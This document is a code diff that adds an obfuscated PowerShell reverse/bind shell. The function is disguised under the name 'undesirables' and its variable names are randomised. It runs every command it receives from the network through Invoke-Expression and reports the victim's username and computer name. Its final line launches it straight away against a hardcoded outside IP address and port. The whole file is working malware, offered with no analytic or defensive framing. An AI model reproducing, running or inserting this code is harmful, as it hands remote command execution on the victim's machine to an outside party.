@@ -1,0 +1,71 @@
+function undesirables 
+{ 
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $wSEKkEvg99,
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $GCdTcimc99,
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+    )
+    
+    try 
+    {
+        if ($GCdTcimc99)
+        {
+            $mnyFYfxG99 = New-Object System.Net.Sockets.TCPClient($wSEKkEvg99,$Port)
+        }
+        if ($Bind)
+        {
+            $XiWJgOkO99 = [System.Net.Sockets.TcpListener]$Port
+            $XiWJgOkO99.start()    
+            $mnyFYfxG99 = $XiWJgOkO99.AcceptTcpClient()
+        } 
+        $qFvLiGbf99 = $mnyFYfxG99.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+        $dRPPsYuD99 = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $qFvLiGbf99.Write($dRPPsYuD99,0,$dRPPsYuD99.Length)
+        $dRPPsYuD99 = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $qFvLiGbf99.Write($dRPPsYuD99,0,$dRPPsYuD99.Length)
+        while(($i = $qFvLiGbf99.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $HCnbSbww99 = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $HCnbSbww99.GetString($bytes,0, $i)
+            try
+            {
+                $sbcROmaM99 = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $EXOZHwxm99  = $sbcROmaM99 + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $EXOZHwxm99 = $EXOZHwxm99 + $x
+            $rAEoAnTj99 = ([text.encoding]::ASCII).GetBytes($EXOZHwxm99)
+            $qFvLiGbf99.Write($rAEoAnTj99,0,$rAEoAnTj99.Length)
+            $qFvLiGbf99.Flush()  
+        }
+        $mnyFYfxG99.Close()
+        if ($XiWJgOkO99)
+        {
+            $XiWJgOkO99.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+undesirables -GCdTcimc99 -wSEKkEvg99 164.92.65.46 -Port 4434
